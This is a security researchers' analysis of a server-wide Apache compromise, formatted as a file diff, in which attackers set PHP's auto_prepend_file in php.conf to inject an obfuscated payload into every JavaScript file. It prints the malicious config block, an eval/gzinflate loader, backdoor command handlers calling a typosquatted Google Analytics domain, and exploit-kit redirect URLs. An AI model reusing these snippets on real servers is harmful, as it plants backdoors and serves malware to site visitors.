@@ -1,0 +1,56 @@
+Apache PHP Injection to JavaScript Files
+
+We have been talking about Apache server-side injections for a while. Ranging from malicious modules, like Darkleech, to modified Apache binaries. From an attacker perspective, it is much more lucrative to inject their malicious code at that level, instead of having to compromise each site on the server individually.
+However, server-side injections are not only limited to Apache modules or binaries. They can also be done via global .htaccess injections and PHP auto appends/preppends, which we will cover in this article.
+
+Auto Prepend JavaScript Files
+PHP has an interesting configuration option called “auto_prepend_file”. It allows administrators to include a file to be automatically parsed before the requested content is executed. Malware authors have been using this option at the site level for a while by modifying the .htaccess file. However, in this instance, they got root access and modified the file /etc/httpd/conf.d/php.conf with the following:
+
+<files ~ ".js$”>
+AddHandler php5-script .js
+php_value auto_prepend_file /usr/share/php/a.control.bin
+php_flag display_errors Off
+</files>
+
+The syntax is very simple and it basically treats every JavaScript as PHP and prepends the content of /usr/share/php/a.control.bin to all JavaScript files. By modifying the Apache configuration they can inject it on every site hosted on the server.
+Injected content
+The file being prepended (a.control.bin) when first inspection was not a normal PHP file. It seemed like an encoded executable and testing on VirusTotal (an engine that checks a file against all 47 major anti virus products), resulted in a0/47 detection rate. It meant the file was never found before and needed more analysis.
+We started to work with the binary and were able to partially decode it. The attackers were using gzip, along with multiple intermixed comments to add useless functions and make it hard to decode:
+
+/* posix_mknod ()	;	jdtojewish) ; gzgetss(imagesetbrush(); mb_stripos */;
+eval/*mcrypt_generic	(	)    ;
+
+In the code mentioned above, none of those functions were not called except for the eval. When we thought it was using mcrypt or posix_mknod, it was just a distraction for the eval part. We also got our ESET friends to help with it. They were able to decode and decrypt the file and found many levels of obfuscation. From their explanation:
+The PHP script uses comments to add junk, it can be reduced to the following: The function __halt_compiler() will stop the parsing of the script before the binary data embedded in the file. It will then be read and decompressed with gzinflate and evaled:
+<?php
+$__ = __FILE__ ;
+eval (gzinflate(file_get_contents($__ ,null, null, (__COMPILER_HALT_OFFSET__))));
+__halt_compiler();
+BINARY_CODE
+
+They also found an interesting backdoor that connects to google-analytcs.com with the user agent “SEX/1”. This allows the malware owners to control the server and execute commands via eval or add any file to the server. These are the commands the malware authors can run:
+
+case “OK”: touch($___["file”]); break;
+case “EXEC”: eval ( base64_decode ($___ ["data”][1])); break;
+case “UPDATE”: file_put_contents ($__,base64_decode($___["data”][1])); break;
+case “ERROR”: default: touch($__,(time()+$___["failed_period”])); break;
+
+Another interesting thing is that when you decode the file, the first line starts with:
+
+/ * Hey ! How did you find me ? 😛 */
+
+Yes, took a bit, but we did find you. You can see the full payload on PHP decoder.
+Browser Injection
+All that encoding is used to do 2 things: Act as a backdoor for the attackers to maintain their access to the server and inject malware on the browser of the visitors to the site. And inject malware they did. Every time a JavaScript file was requested, the following code would be prepended to it:
+
+This code once executed by the browser calls multiple iFrames:
+
+httx://weymouthsmiles.com/wuwu.html
+httx://weymouthsmiles.com/wqlc.html
+httx://www.blog-hits.com/b1.php?id=ballsofsteel
+
+These are used to redirect the browser to the infamous Redkit Exploit Kit (hxxp://weymouthsmiles.com/jo.jar – Trojan.Java/Exploit.CVE-2013-2423.BM).
+It also loads an image from http://google-analytcs.com/domain/ga.gif so the attackers can track the compromised sites and clients.
+Conclusion
+This is just another technique the attackers are using to maintain access to the servers they compromise, and to inject malware, in this case, to the Redkit Exploit Kit. Note that this is not new and we have been seeing cases like this for a while. Tony Perez even talked about it before on a previous post.
+Again, thanks to the ESET team for the help here.
